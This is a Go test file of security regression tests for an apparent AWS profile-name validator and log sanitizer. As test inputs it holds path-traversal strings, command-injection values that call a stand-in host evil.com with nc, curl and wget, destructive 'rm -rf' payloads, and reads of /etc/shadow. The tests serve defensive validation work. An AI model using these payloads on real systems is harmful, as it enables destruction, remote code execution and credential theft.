package validate

import (
	"strings"
	"testing"
)

// ============================================================================
// Security Regression Tests for Input Sanitization (Phase 134)
// ============================================================================
//
// These tests verify input sanitization prevents:
// 1. Path traversal attacks - malicious path sequences rejected
// 2. Command injection - shell metacharacters rejected
// 3. Log injection - control characters sanitized for logging
// 4. Unicode attacks - homoglyphs and non-ASCII rejected for profile names
// 5. Null byte injection - null bytes rejected
//
// Tests use TestSecurityRegression_ prefix for CI/CD filtering.
// ============================================================================

// TestSecurityRegression_PathTraversalPrevention verifies path traversal attacks are blocked.
func TestSecurityRegression_PathTraversalPrevention(t *testing.T) {
	pathTraversalAttempts := []struct {
		name        string
		profile     string
		description string
	}{
		{
			name:        "etc_passwd",
			profile:     "../../../etc/passwd",
			description: "classic path traversal to /etc/passwd",
		},
		{
			name:        "windows_style",
			profile:     "..\\..\\..\\windows\\system32\\config\\sam",
			description: "Windows-style path traversal",
		},
		{
			name:        "encoded_traversal",
			profile:     "%2e%2e%2f%2e%2e%2f",
			description: "URL-encoded traversal (if decoded before validation)",
		},
		{
			name:        "middle_traversal",
			profile:     "/sentinel/../../../secrets/api-key",
			description: "traversal in middle of legitimate-looking path",
		},
		{
			name:        "double_slash",
			profile:     "/sentinel//policies//production",
			description: "double slash path manipulation",
		},
		{
			name:        "current_dir",
			profile:     "./sensitive/file",
			description: "current directory reference",
		},
		{
			name:        "hidden_dir",
			profile:     "/.hidden/secrets",
			description: "hidden directory access",
		},
		{
			name:        "mixed_separators",
			profile:     "../..\\../etc/passwd",
			description: "mixed Unix/Windows separators",
		},
	}

	for _, tc := range pathTraversalAttempts {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateProfileName(tc.profile)
			if err == nil {
				t.Errorf("SECURITY VIOLATION: Path traversal attack not blocked: %s (%s)",
					tc.profile, tc.description)
			}
		})
	}
}

// TestSecurityRegression_CommandInjectionPrevention verifies command injection is blocked.
func TestSecurityRegression_CommandInjectionPrevention(t *testing.T) {
	injectionAttempts := []struct {
		name        string
		profile     string
		description string
	}{
		{
			name:        "semicolon_rm",
			profile:     "profile;rm -rf /",
			description: "semicolon command separator",
		},
		{
			name:        "backtick_whoami",
			profile:     "profile`whoami`",
			description: "backtick command substitution",
		},
		{
			name:        "dollar_paren",
			profile:     "profile$(cat /etc/passwd)",
			description: "dollar-paren command substitution",
		},
		{
			name:        "pipe",
			profile:     "profile|nc evil.com 1234",
			description: "pipe to netcat",
		},
		{
			name:        "ampersand_bg",
			profile:     "profile&curl evil.com/shell.sh|sh",
			description: "background process with shell download",
		},
		{
			name:        "and_chain",
			profile:     "profile&&rm -rf ~",
			description: "AND chain command execution",
		},
		{
			name:        "or_chain",
			profile:     "profile||wget evil.com/mal",
			description: "OR chain command execution",
		},
		{
			name:        "redirect_out",
			profile:     "profile>/etc/crontab",
			description: "redirect stdout to crontab",
		},
		{
			name:        "redirect_in",
			profile:     "profile</etc/shadow",
			description: "redirect from shadow file",
		},
		{
			name:        "env_expansion",
			profile:     "profile$HOME",
			description: "environment variable expansion",
		},
		{
			name:        "env_brace",
			profile:     "profile${PATH}",
			description: "brace-style environment variable",
		},
		{
			name:        "newline_injection",
			profile:     "profile\n/bin/sh",
			description: "newline with shell command",
		},
	}

	for _, tc := range injectionAttempts {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateProfileName(tc.profile)
			if err == nil {
				t.Errorf("SECURITY VIOLATION: Command injection not blocked: %q (%s)",
					tc.profile, tc.description)
			}
		})
	}
}

// TestSecurityRegression_NullByteInjection verifies null byte injection is blocked.
func TestSecurityRegression_NullByteInjection(t *testing.T) {
	nullByteAttempts := []struct {
		name        string
		profile     string
		description string
	}{
		{
			name:        "middle_null",
			profile:     "profile\x00admin",
			description: "null byte in middle to truncate in C code",
		},
		{
			name:        "prefix_null",
			profile:     "\x00/etc/passwd",
			description: "null byte prefix",
		},
		{
			name:        "suffix_null",
			profile:     "profile\x00",
			description: "null byte suffix",
		},
		{
			name:        "multiple_null",
			profile:     "a\x00b\x00c",
			description: "multiple null bytes",
		},
	}

	for _, tc := range nullByteAttempts {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateProfileName(tc.profile)
			if err == nil {
				t.Errorf("SECURITY VIOLATION: Null byte injection not blocked: %q (%s)",
					tc.profile, tc.description)
			}
			if err != nil && err != ErrProfileNameNullByte && err != ErrProfileNameControlChars {
				// Accept either error - both indicate the attack was blocked
				t.Logf("Blocked with: %v (acceptable)", err)
			}
		})
	}
}

// TestSecurityRegression_UnicodeHomoglyphPrevention verifies homoglyph attacks are blocked.
func TestSecurityRegression_UnicodeHomoglyphPrevention(t *testing.T) {
	homoglyphAttempts := []struct {
		name        string
		profile     string
		description string
	}{
		{
			name:        "cyrillic_a",
			profile:     "\u0430dmin", // Cyrillic 'a' looks like Latin 'a'
			description: "Cyrillic 'a' in 'admin'",
		},
		{
			name:        "cyrillic_o",
			profile:     "r\u043Eot", // Cyrillic 'o' looks like Latin 'o'
			description: "Cyrillic 'o' in 'root'",
		},
		{
			name:        "greek_omicron",
			profile:     "r\u03BFot", // Greek omicron looks like 'o'
			description: "Greek omicron in 'root'",
		},
		{
			name:        "fullwidth_latin",
			profile:     "\uff41dmin", // Fullwidth 'a'
			description: "Fullwidth Latin 'a'",
		},
		{
			name:        "latin_extended",
			profile:     "\u0101dmin", // Latin 'a' with macron
			description: "Latin Extended 'a' with macron",
		},
		{
			name:        "zero_width_joiner",
			profile:     "ad\u200Dmin", // Zero-width joiner
			description: "zero-width joiner between characters",
		},
		{
			name:        "rtl_override",
			profile:     "admin\u202Enimda", // Right-to-left override
			description: "right-to-left override character",
		},
	}

	for _, tc := range homoglyphAttempts {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateProfileName(tc.profile)
			if err == nil {
				t.Errorf("SECURITY VIOLATION: Unicode homoglyph attack not blocked: %s (%s)",
					tc.profile, tc.description)
			}
		})
	}
}

// TestSecurityRegression_LogInjectionSanitization verifies log injection is sanitized.
// The security goal is to escape control characters so they appear as visible escape
// sequences (e.g., \u000a) rather than being interpreted as actual control characters.
func TestSecurityRegression_LogInjectionSanitization(t *testing.T) {
	logInjectionAttempts := []struct {
		name           string
		input          string
		mustNotContain []rune // raw control characters that must not appear
		mustContain    string // verify the escape sequence is present
		description    string
	}{
		{
			name:           "newline_injection",
			input:          "user\n[ALERT] System compromised!",
			mustNotContain: []rune{'\n'},
			mustContain:    "\\u000a", // newline escaped
			description:    "newline to inject fake log entry",
		},
		{
			name:           "carriage_return",
			input:          "user\rFake: success",
			mustNotContain: []rune{'\r'},
			mustContain:    "\\u000d", // CR escaped
			description:    "carriage return for log line overwrite",
		},
		{
			name:           "ansi_escape",
			input:          "user\x1b[31mRED TEXT\x1b[0m",
			mustNotContain: []rune{'\x1b'},
			mustContain:    "\\u001b", // ESC escaped
			description:    "ANSI escape for terminal color injection",
		},
		{
			name:           "json_injection",
			input:          `user","admin":true,"other":"`,
			mustNotContain: []rune{},         // no control chars, but quotes escaped
			mustContain:    `\"`,             // quotes are escaped
			description:    "JSON structure injection",
		},
		{
			name:           "null_byte_truncation",
			input:          "safe\x00malicious",
			mustNotContain: []rune{'\x00'},
			mustContain:    "\\u0000", // null escaped
			description:    "null byte for log truncation",
		},
	}

	for _, tc := range logInjectionAttempts {
		t.Run(tc.name, func(t *testing.T) {
			sanitized := SanitizeForLog(tc.input, 200)

			// Verify control characters are not present in raw form
			for _, forbidden := range tc.mustNotContain {
				if strings.ContainsRune(sanitized, forbidden) {
					t.Errorf("SECURITY VIOLATION: Log injection not sanitized, contains raw control char %q: %s (%s)",
						forbidden, sanitized, tc.description)
				}
			}

			// Verify the escape sequence is present (control chars were escaped, not removed)
			if tc.mustContain != "" && !strings.Contains(sanitized, tc.mustContain) {
				t.Errorf("Expected escape sequence %q not found in sanitized output: %s (%s)",
					tc.mustContain, sanitized, tc.description)
			}
		})
	}
}

// TestSecurityRegression_ControlCharacterPrevention verifies control characters are blocked/sanitized.
func TestSecurityRegression_ControlCharacterPrevention(t *testing.T) {
	controlChars := []struct {
		name  string
		char  rune
		ascii int
		desc  string
	}{
		{"NUL", '\x00', 0, "null"},
		{"SOH", '\x01', 1, "start of heading"},
		{"STX", '\x02', 2, "start of text"},
		{"ETX", '\x03', 3, "end of text"},
		{"EOT", '\x04', 4, "end of transmission"},
		{"ENQ", '\x05', 5, "enquiry"},
		{"ACK", '\x06', 6, "acknowledge"},
		{"BEL", '\x07', 7, "bell"},
		{"BS", '\x08', 8, "backspace"},
		{"TAB", '\x09', 9, "horizontal tab"},
		{"LF", '\x0a', 10, "line feed"},
		{"VT", '\x0b', 11, "vertical tab"},
		{"FF", '\x0c', 12, "form feed"},
		{"CR", '\x0d', 13, "carriage return"},
		{"SO", '\x0e', 14, "shift out"},
		{"SI", '\x0f', 15, "shift in"},
		{"DLE", '\x10', 16, "data link escape"},
		{"DC1", '\x11', 17, "device control 1"},
		{"DC2", '\x12', 18, "device control 2"},
		{"DC3", '\x13', 19, "device control 3"},
		{"DC4", '\x14', 20, "device control 4"},
		{"NAK", '\x15', 21, "negative acknowledge"},
		{"SYN", '\x16', 22, "synchronous idle"},
		{"ETB", '\x17', 23, "end of block"},
		{"CAN", '\x18', 24, "cancel"},
		{"EM", '\x19', 25, "end of medium"},
		{"SUB", '\x1a', 26, "substitute"},
		{"ESC", '\x1b', 27, "escape"},
		{"FS", '\x1c', 28, "file separator"},
		{"GS", '\x1d', 29, "group separator"},
		{"RS", '\x1e', 30, "record separator"},
		{"US", '\x1f', 31, "unit separator"},
		{"DEL", '\x7f', 127, "delete"},
	}

	for _, tc := range controlChars {
		t.Run(tc.name, func(t *testing.T) {
			profile := "test" + string(tc.char) + "profile"

			// ValidateProfileName should reject control characters
			err := ValidateProfileName(profile)
			if err == nil {
				t.Errorf("SECURITY VIOLATION: Control character %s (ASCII %d, %s) not rejected in profile name",
					tc.name, tc.ascii, tc.desc)
			}

			// SanitizeForLog should escape control characters
			sanitized := SanitizeForLog(profile, 100)
			if strings.ContainsRune(sanitized, tc.char) {
				t.Errorf("SECURITY VIOLATION: Control character %s (ASCII %d) not sanitized in log output",
					tc.name, tc.ascii)
			}
		})
	}
}

// TestSecurityRegression_LengthLimitEnforcement verifies length limits are enforced.
func TestSecurityRegression_LengthLimitEnforcement(t *testing.T) {
	t.Run("profile_name_length", func(t *testing.T) {
		// Test at boundary
		atLimit := strings.Repeat("a", MaxProfileNameLength)
		if err := ValidateProfileName(atLimit); err != nil {
			t.Errorf("Profile at max length (%d) should be valid, got: %v", MaxProfileNameLength, err)
		}

		// Test over boundary
		overLimit := strings.Repeat("a", MaxProfileNameLength+1)
		if err := ValidateProfileName(overLimit); err == nil {
			t.Errorf("SECURITY VIOLATION: Profile over max length (%d) should be rejected",
				MaxProfileNameLength+1)
		}
	})

	t.Run("sanitize_truncation", func(t *testing.T) {
		// Verify SanitizeForLog respects maxLen
		longInput := strings.Repeat("x", 1000)
		sanitized := SanitizeForLog(longInput, 50)
		if len(sanitized) > 50 {
			t.Errorf("SECURITY VIOLATION: SanitizeForLog did not truncate, len=%d > maxLen=50",
				len(sanitized))
		}
	})
}

// TestSecurityRegression_ValidInputsAccepted verifies legitimate inputs are not rejected.
func TestSecurityRegression_ValidInputsAccepted(t *testing.T) {
	validProfiles := []struct {
		name    string
		profile string
	}{
		{"simple", "production"},
		{"with_hyphen", "prod-role"},
		{"with_underscore", "prod_role"},
		{"ssm_path", "/sentinel/policies/production"},
		{"role_arn", "arn:aws:iam::123456789012:role/prod-role"},
		{"govcloud_arn", "arn:aws-us-gov:iam::123456789012:role/secure-role"},
		{"china_arn", "arn:aws-cn:iam::123456789012:role/cn-role"},
		{"nested_path", "/org/team/env/role"},
		{"alphanumeric", "role123abc"},
		{"uppercase", "PRODUCTION"},
		{"mixed_case", "ProductionRole"},
	}

	for _, tc := range validProfiles {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateProfileName(tc.profile)
			if err != nil {
				t.Errorf("REGRESSION: Valid profile %q rejected: %v", tc.profile, err)
			}
		})
	}
}
